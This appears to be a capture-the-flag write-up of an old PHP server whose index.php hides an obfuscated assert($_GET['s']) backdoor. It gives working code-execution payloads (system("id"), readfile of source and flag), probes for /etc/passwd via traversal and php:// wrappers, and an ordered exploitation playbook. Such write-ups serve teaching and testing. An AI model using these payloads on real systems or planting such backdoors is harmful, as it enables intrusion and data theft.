## Challenge Summary

- Source: user-provided remote challenge
- Target: `http://171.80.2.169:18148/`
- Goal: identify the vulnerable surface and obtain the flag

## Initial Signals

- Entry point: `/` and `/index.php` both return `200 OK` with `Content-Length: 0`
- Visible hints: server is `Apache/2.4.7 (Ubuntu)` with `PHP/5.5.9-1ubuntu4.6`
- First confirming probe: `curl -i http://171.80.2.169:18148/` showed a real PHP-backed page with an empty body rather than a static 404 or Apache default page

## Exploit Chain

1. Confirm the service is a real PHP application even though `/` and `/index.php` return blank `200` responses.
2. Enumerate common files, routes, parameters, headers, and old-PHP branches without finding a visible entrypoint.
3. Use the hint that the code may reconstruct `assert($_GET['s'])` dynamically and test `?s=phpinfo();`.
4. Confirm code execution because `?s=phpinfo();` returns full `phpinfo()` output.
5. Confirm shell execution with `?s=system("id");`.
6. Read the source with `?s=readfile("/var/www/html/index.php");`.
7. Enumerate the filesystem and locate `/var/www/html/flaga15808abee46a1d5.txt`.
8. Read the flag file with `?s=readfile("/var/www/html/flaga15808abee46a1d5.txt");`.

## Key Evidence

- `/` and `/index.php` consistently return `200 OK` with zero-length bodies.
- `?s=phpinfo();` on `/` returns a full `phpinfo()` page, proving that the vulnerable parameter is `s`.
- `?s=system("id");` returns `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, proving command execution.
- `?s=sleep(3);` delays the response by about 3.15 seconds, confirming string-based `assert()` evaluation.
- `?s=readfile("/var/www/html/index.php");` reveals the exact source:
  `<?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>`
- `find /var -maxdepth 3 -iname *flag*` reveals `/var/www/html/flaga15808abee46a1d5.txt`.
- `/index.phps` returns `403 Forbidden`, which suggests source-related handling is configured or at least recognized.
- `/index.phps/`, `/index.phps/1`, and `/index.phps/.php` also return `403`, which means the restriction is not limited to the exact bare filename.
- `/.htaccess` and `/.htpasswd` return `403 Forbidden`, while many common application files return `404`.
- `server-status` exists and is access-controlled with `403 Forbidden`.
- `/icons/README` and several icon files are readable, confirming that Apache default aliases are enabled.
- `/icons/../` normalizes back to the PHP application and returns the same blank `200` page.
- Common parameter probes such as `file`, `page`, `include`, `cmd`, `code`, `shell`, `source`, and `read` produced no body or timing difference in both GET and POST.
- Header probes using `X-Forwarded-For`, `Client-IP`, `X-Real-IP`, `Cookie`, and alternate `Host` values produced no visible difference.
- `?-s` and PHP-CGI style payloads produced no source disclosure or code execution.
- `/index.php/<anything>` consistently returns `200` with an empty body, including traversal-looking and wrapper-looking PATH_INFO strings such as `/index.php/php://filter/...`, `/index.php/file:///etc/passwd`, and `/index.php/..%252f..%252f..%252f..%252fetc/passwd`.

## Dead Ends

- Blind command timing through common parameter names did not produce any >3s delays.
- Cookie-based and header-based backdoor guesses did not change output or timing.
- Source-read style parameters with values like `php://filter/convert.base64-encode/resource=index.php` returned empty bodies.
- Virtual-host guessing with common `Host` values did not move the target off the blank page.
- PATH_INFO tricks did not produce output even when the path strongly resembled LFI/RFI input.
- Alias traversal tests through `/icons/` only produced `400` or `404`, not file disclosure.
- The decisive clue was not visible from HTTP behavior alone; the user-provided code pattern immediately suggested the missing parameter name.

## Reusable Lessons

- A zero-length PHP response is not enough to assume a query-parameter backdoor; parameter-name fuzzing should be split by handler type (`system`, `eval`, `include`) rather than tested with one generic payload.
- In old PHP versions, `assert("php code")` is code execution, so a single missing parameter name can be the whole challenge.
- A `403` on `.phps` is worth tracking, but not enough by itself to conclude source disclosure is nearby.
- If `/index.php/<anything>` always returns the same blank `200`, treat PATH_INFO as a possible dispatcher input, but do not assume it is directly reflected or included.
- When a target stays fully blank across paths, parameters, headers, and timing probes, the next efficient step is targeted path discovery or source acquisition rather than more generic payload guessing.
- Once `assert($_GET['s'])` is suspected, test in this order: `phpinfo();`, `sleep(3);`, `system("id");`, `readfile("source")`.
